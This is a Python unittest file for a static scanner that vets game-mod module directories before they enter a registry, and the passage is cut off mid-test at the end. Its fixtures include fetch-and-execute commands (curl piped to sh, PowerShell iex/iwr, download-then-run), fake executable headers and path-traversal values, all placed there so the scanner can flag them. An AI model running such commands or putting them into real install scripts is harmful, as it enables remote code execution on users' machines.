"""``registry baseline``: a static, deterministic scan of a module or composition directory.

Every fixture is a temporary tree built in the test; the two bundled examples must pass. Nothing
here runs a backend or touches the network, and the route executes nothing in the tree. The
"tree changes under the scan" cases patch the listing (``baseline._lstat``) so the open-side
checks run against a file that is not what the listing said.
"""
import contextlib
import io
import json
import os
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from plutonium_agent_toolkit.cli import entry
from plutonium_agent_toolkit.dev import baseline

ROOT = Path(__file__).resolve().parents[1]
COMMIT = "b" * 40
OTHER = "c" * 40
REPOSITORY = "https://github.com/someone/mods"


def invoke(argv):
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        code = entry(argv)
    return code, json.loads(buf.getvalue())


def declaration(**over):
    row = {"schema": 1, "id": "round_announcer", "version": "0.1.0", "title": "Round announcer", "category": "scripts",
           "kind": "script", "tags": ["example"], "recipe": "project.json", "bases": ["stock"], "maps": ["*"],
           "resource_contract": {"threads": 1, "entities": 0, "hud": 0, "network_fields": 0}}
    row.update(over)
    return row


def recipe(**over):
    row = {"schema": 1, "game": "t6", "mode": "zm", "name": "round_announcer",
           "scripts": [{"source": "scripts/round_announcer.gsc", "target": "scripts/zm/round_announcer.gsc", "instance": "server"}],
           "assets": [], "loads": []}
    row.update(over)
    return row


def stat_with(st: os.stat_result, **over) -> os.stat_result:
    """A copy of a stat result with some fields replaced (the listing's view of a changed file)."""
    names = ["st_mode", "st_ino", "st_dev", "st_nlink", "st_uid", "st_gid", "st_size", "st_atime", "st_mtime", "st_ctime"]
    fields = [getattr(st, n) for n in names]
    for key, value in over.items():
        fields[names.index(key)] = value
    return os.stat_result(tuple(fields))


class BaselineFixture(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.root = Path(self.temp.name)
        self.saved = os.environ.get("PAT_HOME")
        os.environ["PAT_HOME"] = str(self.root / "home")
        self.addCleanup(self._restore)
        self.n = 0

    def _restore(self):
        if self.saved is None:
            os.environ.pop("PAT_HOME", None)
        else:
            os.environ["PAT_HOME"] = self.saved

    def out(self):
        self.n += 1
        return str(self.root / f"job-{self.n:03d}")

    def module(self, name="module", files=None, decl=None, rec=None):
        """A module directory: module.json, project.json, one script, plus any extra files."""
        directory = self.root / name
        directory.mkdir(parents=True, exist_ok=True)
        (directory / "module.json").write_text(json.dumps(declaration(**(decl or {})), indent=2))
        (directory / "project.json").write_text(json.dumps(recipe(**(rec or {})), indent=2))
        (directory / "scripts").mkdir(exist_ok=True)
        (directory / "scripts" / "round_announcer.gsc").write_text("main()\n{\n    level thread announce();\n}\n")
        for rel, data in (files or {}).items():
            p = directory / rel
            p.parent.mkdir(parents=True, exist_ok=True)
            if isinstance(data, bytes):
                p.write_bytes(data)
            else:
                p.write_text(data)
        return directory

    def pack(self, name, modules, **extra):
        directory = self.root / name
        directory.mkdir(parents=True, exist_ok=True)
        data = {"schema": 1, "name": "stock_pack_test", "base": "stock", "map": "zm_transit", "modules": modules, **extra}
        (directory / "composition.json").write_text(json.dumps(data, indent=2))
        return directory

    def listing_of(self, target: Path, replacement):
        """The listing's view of ``target`` becomes ``replacement(real_stat)`` and its link check says
        "not a link"; every other entry is real. This is the race the open-side checks exist for: the
        directory listing saw a regular file, and what is on disk by the time it is opened differs."""
        real_lstat, real_is_link = baseline._lstat, baseline._is_link

        def fake_lstat(entry):
            st = real_lstat(entry)
            return replacement(st) if entry == target else st

        def fake_is_link(entry):
            return False if entry == target else real_is_link(entry)
        stack = contextlib.ExitStack()
        stack.enter_context(mock.patch.object(baseline, "_lstat", side_effect=fake_lstat))
        stack.enter_context(mock.patch.object(baseline, "_is_link", side_effect=fake_is_link))
        return stack

    def scan(self, directory, *extra):
        code, row = invoke(["registry", "baseline", str(directory), *extra, "--output", self.out()])
        return code, row

    def ids(self, row, kind):
        return sorted(r["id"] for r in row["result"][kind])

    def findings(self, row, rule):
        return [r for r in row["result"]["findings"] if r["id"] == rule]


class ExampleTests(BaselineFixture):
    def test_the_bundled_examples_pass(self):
        # A module is scanned from its own directory; a pack from the directory that holds the
        # pack and every member it names (here examples/, as a registry scans the repository).
        for directory in (ROOT / "examples" / "hello-zm", ROOT / "examples"):
            code, row = self.scan(directory)
            self.assertEqual(code, 0, row)
            result = row["result"]
            self.assertEqual(result["outcome"], "passed", (directory.name, result["findings"], result["capabilities"]))
            self.assertFalse(result["blocked"])
            self.assertEqual(result["findings"], [])
            self.assertEqual(result["capabilities"], [])
            self.assertEqual(result["warnings"], [])
            self.assertEqual(result["unreadable"], [])
            self.assertEqual(result["policy_version"], "1")
            self.assertEqual(result["enforcement"], "selective")
            self.assertEqual(result["report"], "baseline.json")
            self.assertTrue(result["not_a_security_audit"])
            self.assertIn("not a security audit", result["disclaimer"])
            report = json.loads((Path(result["output"]) / "baseline.json").read_text(encoding="utf-8"))
            self.assertEqual(report["outcome"], "passed")
            self.assertEqual(report["disclaimer"], baseline.DISCLAIMER)
            receipt = json.loads((Path(result["output"]) / "receipt.json").read_text(encoding="utf-8"))
            self.assertEqual(receipt["status"], "succeeded")
            self.assertIn("baseline.json", receipt["outputs"])
            self.assertEqual(receipt["steps"], [], "nothing was executed")
        code, row = self.scan(ROOT / "examples" / "hello-zm")
        self.assertEqual(row["result"]["declaration"]["id"], "hello_zm")
        self.assertEqual(row["result"]["declaration"]["payload"], "recipe")
        code, row = self.scan(ROOT / "examples")
        self.assertIsNone(row["result"]["declaration"], "no declaration at the root of examples/")
        nested = {r["file"]: r for r in row["result"]["nested_declarations"]}
        self.assertEqual(sorted(nested), ["hello-pack/composition.json", "hello-zm-two/module.json", "hello-zm/module.json"])
        pack = nested["hello-pack/composition.json"]
        self.assertEqual(pack["kind"], "composition")
        self.assertEqual([(m["path"], m["exists"], m["declares"]) for m in pack["members"]],
                         [("../hello-zm", True, "module.json"), ("../hello-zm-two", True, "module.json")])

    def test_a_pack_scanned_from_its_own_directory_reports_its_siblings_as_outside(self):
        # examples/hello-pack names ../hello-zm and ../hello-zm-two: from the pack's own directory
        # they are outside the snapshot, which is a path-escape, and the evidence says where to scan from.
        code, row = self.scan(ROOT / "examples" / "hello-pack")
        self.assertEqual(code, 0, row)
        self.assertEqual(row["result"]["outcome"], "needs-fixes")
        rows = self.findings(row, "path-escape")
        self.assertEqual([r["file"] for r in rows], ["composition.json", "composition.json"])
        self.assertTrue(all("outside the scanned directory" in r["evidence"] and "holds every member" in r["evidence"] for r in rows), rows)
        members = row["result"]["declaration"]["members"]
        self.assertTrue(all(m["outside_scan_root"] and "exists" not in m for m in members), "nothing outside the tree is inspected")


class BlockingFindingTests(BaselineFixture):
    def test_pe_header_under_a_text_name_is_a_native_plugin(self):
        directory = self.module(files={"docs/notes.txt": b"MZ\x90\x00\x03\x00\x00\x00" + b"\x00" * 64})
        code, row = self.scan(directory)
        self.assertEqual(code, 0, row)
        self.assertEqual(row["result"]["outcome"], "needs-fixes")
        self.assertTrue(row["result"]["blocked"])
        finding = row["result"]["findings"][0]
        self.assertEqual((finding["id"], finding["kind"], finding["blocking"], finding["file"], finding["line"]),
                         ("native-plugin", "finding", True, "docs/notes.txt", None))
        self.assertIn("MZ", finding["evidence"])

    def test_elf_and_macho_headers_and_plugin_paths(self):
        directory = self.module(files={"a.bin": b"\x7fELF" + b"\x00" * 32, "b.bin": b"\xcf\xfa\xed\xfe" + b"\x00" * 32,
                                       "c.bin": b"\xca\xfe\xba\xbe" + b"\x00" * 32,
                                       "README.md": "Copy the file into %LOCALAPPDATA%\\Plutonium\\plugins\\ before you start.\n",
                                       "install.txt": "then the loader picks up plugins/hook.dll on launch\n"})
        code, row = self.scan(directory)
        self.assertEqual(row["result"]["outcome"], "needs-fixes")
        rows = [(r["file"], r["line"]) for r in self.findings(row, "native-plugin")]
        self.assertEqual(rows, [("README.md", 1), ("a.bin", None), ("b.bin", None), ("c.bin", None), ("install.txt", 1)])

    def test_curl_pipe_sh_is_download_and_execute_and_the_script_is_an_installer(self):
        directory = self.module(files={"tools/get.sh": "#!/bin/sh\ncurl https://x.invalid/setup.sh | sh\n"})
        code, row = self.scan(directory)
        self.assertEqual(code, 0, row)
        self.assertEqual(row["result"]["outcome"], "needs-fixes")
        finding = self.findings(row, "download-and-execute")
        self.assertEqual(len(finding), 1, row["result"]["findings"])
        self.assertEqual((finding[0]["file"], finding[0]["line"], finding[0]["blocking"]), ("tools/get.sh", 2, True))
        self.assertIn("curl https://x.invalid/setup.sh | sh", finding[0]["evidence"])
        self.assertEqual(self.ids(row, "capabilities"), ["installer"])

    def test_powershell_forms_and_a_downloaded_file_started_later(self):
        directory = self.module(files={
            "setup.ps1": "iex (iwr https://x.invalid/run.ps1)\nInvoke-Expression $payload\n",
            "tools/fetch.ps1": "Invoke-WebRequest -Uri https://x.invalid/tool.exe -OutFile tool.exe\n\nStart-Process .\\tool.exe -Wait\n",
            "tools/fetch.sh": "curl -L -o helper.sh https://x.invalid/helper.sh\nchmod +x helper.sh\n./helper.sh\n",
            "tools/amp.cmd": "curl https://x.invalid/run.exe -o run.exe\n& run.exe /S\n",
            "tools/harmless.sh": "curl -o data.json https://x.invalid/data.json\ncat data.json\n",
        })
        code, row = self.scan(directory)
        self.assertEqual(row["result"]["outcome"], "needs-fixes")
        rows = [(r["file"], r["line"]) for r in self.findings(row, "download-and-execute")]
        self.assertEqual(rows, [("setup.ps1", 1), ("setup.ps1", 2), ("tools/amp.cmd", 2), ("tools/fetch.ps1", 3), ("tools/fetch.sh", 3)])
        started = [r for r in self.findings(row, "download-and-execute") if r["file"] == "tools/fetch.ps1"][0]
        self.assertIn("downloaded on line 1", started["evidence"])
        # The .exe URL without a hash is also an unpinned acquisition; the harmless download is neither.
        self.assertIn(("unpinned-acquisition", "tools/fetch.ps1", 1), [(r["id"], r["file"], r["line"]) for r in row["result"]["findings"]])
        self.assertEqual([r for r in row["result"]["findings"] if r["file"] == "tools/harmless.sh"], [])
        self.assertLessEqual(max(len(r["evidence"]) for r in row["result"]["findings"]), 160)

    def test_a_link_anywhere_in_the_tree_is_a_path_escape(self):
        directory = self.module()
        outside = self.root / "outside.txt"
        outside.write_text("x")
        try:
            os.symlink(outside, directory / "linked.txt")
        except (OSError, NotImplementedError):
            self.skipTest("this host cannot create links")
        code, row = self.scan(directory)
        self.assertEqual(code, 0, row)
        self.assertEqual(row["result"]["outcome"], "needs-fixes")
        self.assertEqual([(r["file"], r["line"]) for r in self.findings(row, "path-escape")], [("linked.txt", None)])
        self.assertEqual(row["result"]["skipped"], [{"path": "linked.txt", "reason": "link; not followed"}])
        self.assertEqual(row["result"]["scanned"]["files"], 3, "the link is neither scanned nor counted")

    def test_parent_segment_in_a_recipe_source_is_a_path_escape(self):
        directory = self.module(rec={"scripts": [{"source": "../evil.gsc", "target": "scripts/zm/evil.gsc", "instance": "server"}]})
        code, row = self.scan(directory)
        self.assertEqual(row["result"]["outcome"], "needs-fixes")
        finding = self.findings(row, "path-escape")
        self.assertEqual(len(finding), 1, row["result"]["findings"])
        self.assertEqual(finding[0]["file"], "project.json")
        self.assertIsInstance(finding[0]["line"], int)
        self.assertIn("../evil.gsc", finding[0]["evidence"])

    def test_absolute_paths_and_windows_drives_in_declarations_are_path_escapes(self):
        for value, word in (("/etc/project.json", "absolute"), ("C:outside/project.json", "drive"), ("D:\\mods\\project.json", "drive"),
                            ("\\\\server\\share\\project.json", "absolute")):
            directory = self.module(f"m-{word}-{len(value)}", decl={"recipe": value})
            code, row = self.scan(directory)
            self.assertEqual(row["result"]["outcome"], "needs-fixes", value)
            finding = self.findings(row, "path-escape")
            self.assertEqual([r["file"] for r in finding], ["module.json"], value)
            self.assertIn("absolute path or Windows drive", finding[0]["evidence"], value)
        # A drive-relative recipe source too: the recipe is confined to its directory on every OS.
        directory = self.module("rec", rec={"scripts": [{"source": "C:scripts/x.gsc", "target": "scripts/zm/x.gsc", "instance": "server"}]})
        code, row = self.scan(directory)
        self.assertEqual([r["file"] for r in self.findings(row, "path-escape")], ["project.json"])

    def test_a_composition_names_siblings_inside_the_scanned_directory_only(self):
        # The pack and its member live under tree/; the scan root is tree/, so ../module is a
        # sibling inside the snapshot, ../missing is a missing sibling, /abs/dir is absolute, and
        # ../../outside-module and a load two levels up resolve outside the scanned directory.
        self.module("tree/module")
        (self.root / "outside-module").mkdir()
        (self.root / "outside-module" / "module.json").write_text(json.dumps(declaration()))
        pack = self.pack("tree/pack", ["../module", {"path": "../missing", "role": "base"}, "/abs/dir", "../../outside-module"],
                         loads=["../../base/common_zm.ff"])
        code, row = self.scan(self.root / "tree")
        self.assertEqual(code, 0, row)
        self.assertEqual(row["result"]["outcome"], "needs-fixes")
        escapes = self.findings(row, "path-escape")
        self.assertEqual(len(escapes), 3, escapes)
        self.assertTrue(all(r["file"] == "pack/composition.json" for r in escapes))
        self.assertIn("/abs/dir", escapes[0]["evidence"])
        self.assertIn("../../outside-module", escapes[1]["evidence"])
        self.assertIn("outside the scanned directory", escapes[1]["evidence"])
        self.assertIn("../../base/common_zm.ff", escapes[2]["evidence"])
        mismatch = self.findings(row, "declaration-mismatch")
        self.assertEqual(len(mismatch), 1, mismatch)
        self.assertIn("../missing", mismatch[0]["evidence"])
        nested = {r["file"]: r for r in row["result"]["nested_declarations"]}
        self.assertEqual(sorted(nested), ["module/module.json", "pack/composition.json"])
        members = nested["pack/composition.json"]["members"]
        self.assertEqual(members[0], {"path": "../module", "outside_scan_root": False, "exists": True, "declares": "module.json"})
        self.assertEqual(members[1]["exists"], False)
        self.assertEqual(members[3], {"path": "../../outside-module", "outside_scan_root": True})
        self.assertEqual(row["result"]["scanned"]["files"], 4, "module.json, project.json, the script and the pack; nothing outside the tree")
        # The same pack scanned from its own directory: even the good sibling is outside.
        code, row = self.scan(pack)
        evidence = [r["evidence"] for r in self.findings(row, "path-escape")]
        self.assertTrue(any("'../module'" in e and "outside the scanned directory" in e for e in evidence), evidence)


class ReviewFindingTests(BaselineFixture):
    def test_unpinned_archive_url_and_a_hash_on_the_next_line(self):
        directory = self.module(files={"README.md": "Get the seed from https://example.invalid/files/seed_pack.zip and unzip it.\n"})
        code, row = self.scan(directory)
        self.assertEqual(row["result"]["outcome"], "review-required")
        self.assertFalse(row["result"]["blocked"])
        finding = row["result"]["findings"]
        self.assertEqual([(r["id"], r["file"], r["line"], r["blocking"]) for r in finding], [("unpinned-acquisition", "README.md", 1, False)])
        pinned = self.module("pinned", files={"README.md": "Get the seed from https://example.invalid/files/seed_pack.zip\nsha256: "
                                                           + "a" * 64 + "\n"})
        code, row = self.scan(pinned)
        self.assertEqual(row["result"]["findings"], [])
        self.assertEqual(row["result"]["outcome"], "passed")
        same_line = self.module("same-line", files={"README.md": "https://example.invalid/x.tar.gz (" + "f" * 64 + ")\n"})
        code, row = self.scan(same_line)
        self.assertEqual(row["result"]["findings"], [])
        far = self.module("far", files={"README.md": "https://example.invalid/x.7z\n\n\n\n\n\n\n" + "f" * 64 + "\n"})
        code, row = self.scan(far)
        self.assertEqual(self.ids(row, "findings"), ["unpinned-acquisition"], "a hash more than five lines below does not pin")
        page = self.module("page", files={"README.md": "See https://example.invalid/docs/index.html for the guide.\n"})
        code, row = self.scan(page)
        self.assertEqual(row["result"]["findings"], [], "only archive, package and installer URLs count")

    def test_declaration_mismatch_against_the_listing(self):
        directory = self.module(decl={"source": {"repository": REPOSITORY, "commit": COMMIT}})
        code, row = self.scan(directory, "--repository", REPOSITORY, "--commit", COMMIT)
        self.assertEqual(code, 0, row)
        self.assertEqual(row["result"]["outcome"], "passed")
        self.assertEqual(row["result"]["expected"], {"repository": REPOSITORY, "commit": COMMIT})
        code, row = self.scan(directory, "--repository", "https://github.com/other/mods", "--commit", OTHER)
        self.assertEqual(row["result"]["outcome"], "review-required")
        rows = self.findings(row, "declaration-mismatch")
        self.assertEqual(len(rows), 2, rows)
        self.assertTrue(all(r["file"] == "module.json" and not r["blocking"] for r in rows))
        self.assertIn("source.repository", rows[0]["evidence"])
        self.assertIn("source.commit", rows[1]["evidence"])
        # Without the options only the on-disk checks apply.
        code, row = self.scan(directory)
        self.assertEqual(row["result"]["findings"], [])
        code, row = self.scan(directory, "--commit", "main")
        self.assertEqual(row["error_code"], "input_invalid")
        code, row = self.scan(directory, "--repository", "http://github.com/someone/mods")
        self.assertEqual(row["error_code"], "input_invalid")

    def test_source_fields_of_the_wrong_type_or_form_are_mismatches(self):
        # A number where a string belongs used to slip past the comparison; every present field is
        # checked for its documented form first, with or without the listing options.
        typed = self.module("typed", decl={"source": {"repository": 123, "commit": 456}})
        for extra in ((), ("--repository", REPOSITORY, "--commit", COMMIT)):
            code, row = self.scan(typed, *extra)
            self.assertEqual(code, 0, row)
            self.assertEqual(row["result"]["outcome"], "review-required", extra)
            rows = self.findings(row, "declaration-mismatch")
            self.assertEqual(sorted(r["evidence"][:26] for r in rows), ["source.commit is not a 40-", "source.repository is not a"], rows)
        forms = self.module("forms", decl={"source": {"repository": "http://github.com/x/y", "commit": "abc"}})
        code, row = self.scan(forms, "--repository", REPOSITORY, "--commit", COMMIT)
        self.assertEqual(len(self.findings(row, "declaration-mismatch")), 2)
        listy = self.module("listy", decl={"source": ["https://github.com/x/y"]})
        code, row = self.scan(listy)
        rows = self.findings(row, "declaration-mismatch")
        self.assertEqual(len(rows), 1, rows)
        self.assertIn("source is not an object", rows[0]["evidence"])
        upper = self.module("upper", decl={"source": {"repository": REPOSITORY, "commit": COMMIT.upper()}})
        code, row = self.scan(upper, "--commit", COMMIT)
        self.assertEqual([r["evidence"][:14] for r in self.findings(row, "declaration-mismatch")], ["source.commit "])

    def test_declaration_on_disk_checks(self):
        missing = self.module("missing", decl={"recipe": "recipes/project.json"})
        code, row = self.scan(missing)
        rows = self.findings(row, "declaration-mismatch")
        self.assertEqual(len(rows), 1, rows)
        self.assertIn("missing on disk", rows[0]["evidence"])
        empty = self.module("empty", decl={"bases": [], "maps": "zm_transit"})
        code, row = self.scan(empty)
        rows = [r["evidence"] for r in self.findings(row, "declaration-mismatch")]
        self.assertEqual(len(rows), 2, rows)
        self.assertTrue(any("bases" in e for e in rows) and any("maps" in e for e in rows))
        broken = self.module("broken")
        (broken / "module.json").write_text('{"schema": 1, "id": "x",\n  "version": ')
        code, row = self.scan(broken)
        rows = self.findings(row, "declaration-mismatch")
        self.assertEqual(len(rows), 1, rows)
        self.assertIn("not valid JSON", rows[0]["evidence"])
        self.assertEqual(row["result"]["declaration"], {"file": "module.json", "kind": "module", "valid": False})
        self.assertEqual(row["result"]["outcome"], "review-required")
        binary = self.module("binary")
        (binary / "module.json").write_bytes(b"\x00\x01\x02")
        code, row = self.scan(binary)
        rows = [r["evidence"] for r in self.findings(row, "declaration-mismatch")]
        self.assertEqual(rows, ["declaration is not a text file"])
        self.assertEqual(row["result"]["declaration"], {"file": "module.json", "kind": "module", "valid": False})

    def test_no_resource_contract_is_a_warning_and_does_not_change_the_outcome(self):
        decl = declaration()
        del decl["resource_contract"]
        directory = self.module()
        (directory / "module.json").write_text(json.dumps(decl))
        code, row = self.scan(directory)
        self.assertEqual(row["result"]["outcome"], "passed")
        self.assertEqual([(r["id"], r["kind"], r["blocking"], r["file"]) for r in row["result"]["warnings"]],
                         [("no-resource-contract", "warning", False, "module.json")])
        self.assertFalse(row["result"]["declaration"]["resource_contract"])


class CapabilityTests(BaselineFixture):
    def test_each_capability_from_a_minimal_fixture(self):
        cases = {
            "installer": {"Setup.txt": "read me\n"},
            "bundled-package": {"seed/mod.ff": b"\x00TAff" + b"\x00" * 16},
            "lua-ui": {"ui_mp/t6/menu.txt": "x\n"},
            "file-io": {"scripts/io.gsc": "main()\n{\n    f = fs_fopen( \"x.txt\", \"write\" );\n}\n"},
            "client-dvar": {"scripts/dv.gsc": "main()\n{\n    self setClientDvar( \"cg_fov\", 90 );\n}\n"},
            "function-replacement": {"scripts/rf.gsc": "main()\n{\n    replaceFunc( level.x, ::y );\n}\n"},
            "command-hook": {"scripts/ch.gsc": "main()\n{\n    self notifyOnPlayerCommand( \"x\", \"+frag\" );\n}\n"},
        }
        for cap, files in cases.items():
            directory = self.module(cap, files=files)
            code, row = self.scan(directory)
            self.assertEqual(code, 0, row)
            self.assertEqual(row["result"]["outcome"], "review-required", cap)
            self.assertEqual(row["result"]["findings"], [], cap)
            rows = row["result"]["capabilities"]
            self.assertEqual([r["id"] for r in rows], [cap], (cap, rows))
            self.assertEqual((rows[0]["kind"], rows[0]["blocking"]), ("capability", False))
            self.assertEqual(rows[0]["file"], next(iter(files)))
        lua = self.module("lua", files={"scripts/thing.lua": "print(1)\n"})
        code, row = self.scan(lua)
        self.assertEqual(self.ids(row, "capabilities"), ["lua-ui"])
        package = self.module("package", files={"seed/mod.ff": b"\x00" * 8})
        code, row = self.scan(package)
        self.assertIn("8 bytes", row["result"]["capabilities"][0]["evidence"])
        # A script capability appears once per file even when the call repeats.
        many = self.module("many", files={"scripts/io.gsc": "fs_fopen();\nfs_write();\nfs_fclose();\n"})
        code, row = self.scan(many)
        self.assertEqual([(r["id"], r["line"]) for r in row["result"]["capabilities"]], [("file-io", 1)])
        # Text is not a script: no script capabilities from a README quoting the builtin names.
        prose = self.module("prose", files={"README.md": "It calls setClientDvar and replaceFunc and fs_write.\n"})
        code, row = self.scan(prose)
        self.assertEqual(row["result"]["capabilities"], [])

    def test_global_tooling_from_a_recipe_target_and_a_composition_member(self):
        directory = self.module(rec={"scripts": [{"source": "scripts/round_announcer.gsc", "target": "raw/scripts/zm/announcer.gsc", "instance": "server"}]})
        code, row = self.scan(directory)
        rows = row["result"]["capabilities"]
        self.assertEqual([(r["id"], r["file"]) for r in rows], [("global-tooling", "project.json")])
        self.assertIn("raw/scripts/zm/announcer.gsc", rows[0]["evidence"])
        pack = self.pack("pack", ["raw/scripts"])
        (pack / "raw" / "scripts").mkdir(parents=True)
        code, row = self.scan(pack)
        self.assertEqual(self.ids(row, "capabilities"), ["global-tooling"])

    def test_bundled_assets_above_eight_mebibytes(self):
        big = self.module(files={"assets/pack.bin": b"\x00" * 1024})
        with (big / "assets" / "pack.bin").open("r+b") as handle:
            handle.truncate(8 * 1024 * 1024 + 1)
        code, row = self.scan(big)
        self.assertEqual(code, 0, row)
        rows = row["result"]["capabilities"]
        self.assertEqual([(r["id"], r["file"], r["line"]) for r in rows], [("bundled-assets", ".", None)])
        self.assertIn(str(8 * 1024 * 1024 + 1), rows[0]["evidence"])
        self.assertEqual(row["result"]["scanned"]["binary_files"], 1)
        small = self.module("small", files={"assets/pack.bin": b"\x00" * 4096})
        code, row = self.scan(small)
        self.assertEqual(row["result"]["capabilities"], [])

    def test_large_text_is_reported_and_not_pattern_scanned(self):
        directory = self.module(files={"docs/big.txt": "curl https://x.invalid/a | sh\n" + "x" * 4096})
        with mock.patch.object(baseline, "MAX_TEXT", 1024):
            code, row = self.scan(directory)
        self.assertEqual(code, 0, row)
        self.assertEqual(row["result"]["findings"], [], "the large file was not pattern-scanned")
        self.assertEqual([(r["id"], r["file"]) for r in row["result"]["capabilities"]], [("large-text", "docs/big.txt")])
        self.assertEqual(row["result"]["outcome"], "review-required")
        self.assertEqual(row["result"]["scanned"]["text_files"], 4)


class IncompleteAndBoundsTests(BaselineFixture):
    def test_an_unreadable_file_makes_the_scan_incomplete(self):
        if os.name == "nt" or os.geteuid() == 0:
            self.skipTest("mode bits do not deny reads here")
        directory = self.module(files={"secret.txt": "x\n"})
        target = directory / "secret.txt"
        target.chmod(0)
        self.addCleanup(target.chmod, 0o644)
        code, row = self.scan(directory)
        self.assertEqual(code, 0, row)
        self.assertEqual(row["result"]["outcome"], "incomplete")
        self.assertTrue(row["result"]["blocked"], "incomplete fails closed")
        self.assertEqual([r["path"] for r in row["result"]["unreadable"]], ["secret.txt"])
        self.assertTrue(row["result"]["unreadable"][0]["reason"])
        self.assertEqual(row["result"]["scanned"]["files"], 3)

    def test_an_unreadable_directory_makes_the_scan_incomplete(self):
        if os.name == "nt" or os.geteuid() == 0:
            self.skipTest("mode bits do not deny reads here")
        directory = self.module(files={"private/x.txt": "x\n"})
        target = directory / "private"
        target.chmod(0)
        self.addCleanup(target.chmod, 0o755)
        code, row = self.scan(directory)
        self.assertEqual(row["result"]["outcome"], "incomplete")
        self.assertEqual([r["path"] for r in row["result"]["unreadable"]], ["private"])

    def test_a_file_replaced_between_listing_and_reading_is_unreadable(self):
        if os.name == "nt":
            self.skipTest("the inode check and FIFOs are POSIX")
        # Same path, another inode: the listing saw one file and the open found another.
        directory = self.module(files={"swap.txt": "x\n"})
        with self.listing_of(directory / "swap.txt", lambda st: stat_with(st, st_ino=st.st_ino + 1)):
            code, row = self.scan(directory)
        self.assertEqual(code, 0, row)
        self.assertEqual(row["result"]["outcome"], "incomplete")
        self.assertEqual(row["result"]["unreadable"], [{"path": "swap.txt", "reason": "replaced between listing and reading"}])
        self.assertEqual(row["result"]["scanned"]["files"], 3, "the replaced entry is not counted or hashed")
        # A regular file swapped for a link to an outside file: the no-follow open refuses it.
        outside = self.root / "outside.txt"
        outside.write_text("curl https://x.invalid/a | sh\n")
        listed = (directory / "swap.txt").lstat()
        (directory / "swap.txt").unlink()
        os.symlink(outside, directory / "swap.txt")
        with self.listing_of(directory / "swap.txt", lambda st: listed):
            code, row = self.scan(directory)
        self.assertEqual(row["result"]["outcome"], "incomplete")
        self.assertEqual([r["path"] for r in row["result"]["unreadable"]], ["swap.txt"])
        self.assertIn("symbolic link", row["result"]["unreadable"][0]["reason"].lower(), "refused by the no-follow open")
        self.assertEqual(row["result"]["findings"], [], "the outside file was never read")
        # A regular file swapped for a FIFO with no writer: the non-blocking open does not hang and
        # the descriptor is refused because it is not a regular file.
        (directory / "swap.txt").unlink()
        os.mkfifo(directory / "swap.txt")
        with self.listing_of(directory / "swap.txt", lambda st: listed):
            code, row = self.scan(directory)
        self.assertEqual(row["result"]["outcome"], "incomplete")
        self.assertEqual(row["result"]["unreadable"], [{"path": "swap.txt", "reason": "not a regular file when opened"}])

    def test_a_file_that_grows_after_the_listing_cannot_exceed_the_byte_bound(self):
        # The listing said 10 bytes; the file is larger by the time it is read. The bound applies
        # to the bytes actually read, so the scan is an input_limit refusal, not a report.
        directory = self.module(files={"grow.bin": b"\x00" * 5000})
        with mock.patch.object(baseline, "MAX_BYTES", 4096), self.listing_of(directory / "grow.bin", lambda st: stat_with(st, st_size=10)):
            code, row = self.scan(directory)
        self.assertEqual(code, 1, row)
        self.assertEqual(row["error_code"], "input_limit")
        self.assertIn("grew", row["hint"])
        self.assertFalse((Path(row["receipt"]).parent / "baseline.json").exists(), "nothing was judged")

    def test_same_tree_scanned_twice_yields_identical_reports(self):
        directory = self.module(files={"README.md": "https://example.invalid/x.zip\n", "scripts/io.gsc": "fs_fopen();\n",
                                       "ui/a.txt": "x\n", "b.bin": b"\x00\x01"})
        code, first = self.scan(directory)
        code, second = self.scan(directory)
        one = (Path(first["result"]["output"]) / "baseline.json").read_bytes()
        two = (Path(second["result"]["output"]) / "baseline.json").read_bytes()
        self.assertEqual(one, two)
        self.assertNotEqual(first["result"]["job_id"], second["result"]["job_id"])
        self.assertEqual(first["result"]["tree_sha256"], second["result"]["tree_sha256"])
        (directory / "README.md").write_text("changed\n")
        code, third = self.scan(directory)
        self.assertNotEqual(third["result"]["tree_sha256"], first["result"]["tree_sha256"])
        # Rows are sorted by file, line, id whatever the walk order.
        keys = [(r["file"], r["line"] if r["line"] is not None else -1, r["id"]) for r in first["result"]["capabilities"]]
        self.assertEqual(keys, sorted(keys))

    def test_file_count_bound_is_a_structured_refusal(self):
        directory = self.module(files={f"docs/{i}.txt": "x\n" for i in range(6)})
        with mock.patch.object(baseline, "MAX_FILES", 5):
            code, row = self.scan(directory)
        self.assertEqual(code, 1)
        self.assertEqual(row["error_code"], "input_limit")
        self.assertIn("5 files", row["message"])
        receipt = json.loads(Path(row["receipt"]).read_text(encoding="utf-8"))
        self.assertEqual(receipt["status"], "failed")
        with mock.patch.object(baseline, "MAX_BYTES", 100):
            code, row = self.scan(directory)
        self.assertEqual(row["error_code"], "input_limit")

    def test_rows_per_file_and_rule_are_bounded_and_the_rest_counted(self):
        text = "".join(f"Invoke-Expression $x{i}\n" for i in range(25))
        directory = self.module(files={"tools/many.ps1": text})
        code, row = self.scan(directory)
        rows = self.findings(row, "download-and-execute")
        self.assertEqual(len(rows), baseline.ROWS_PER_FILE_AND_RULE)
        self.assertEqual(row["result"]["truncated"], [{"file": "tools/many.ps1", "id": "download-and-execute", "omitted": 5}])

    def test_git_metadata_is_skipped_and_reported(self):
        directory = self.module(files={".git/HEAD": "ref: refs/heads/main\n", ".git/objects/x": b"\x00"})
        code, row = self.scan(directory)
        self.assertEqual(row["result"]["outcome"], "passed")
        self.assertEqual(row["result"]["skipped"], [{"path": ".git", "reason": "git metadata; never part of a snapshot, not scanned"}])
        self.assertEqual(row["result"]["scanned"]["files"], 3)


class RouteTests(BaselineFixture):
    def test_baseline_is_a_job_and_the_other_registry_actions_are_not(self):
        directory = self.module()
        code, row = invoke(["registry", "baseline", str(directory)])
        self.assertEqual(code, 2, row)
        self.assertEqual(row["error_code"], "invalid_arguments")
        out = self.out()
        Path(out).mkdir()
        code, row = invoke(["registry", "baseline", str(directory), "--output", out])
        self.assertEqual(row["error_code"], "output_exists")
        code, row = invoke(["registry", "baseline", str(self.root / "nowhere"), "--output", self.out()])
        self.assertEqual(row["error_code"], "input_missing")
        code, row = invoke(["registry", "baseline", str(directory / "module.json"), "--output", self.out()])
        self.assertEqual(row["error_code"], "input_invalid")
        # An output inside the tree is refused before anything is read; like every job, the directory
        # and its failed receipt exist (receipts are written on every exit path), the report does not.
        code, row = invoke(["registry", "baseline", str(directory), "--output", str(directory / "inside")])
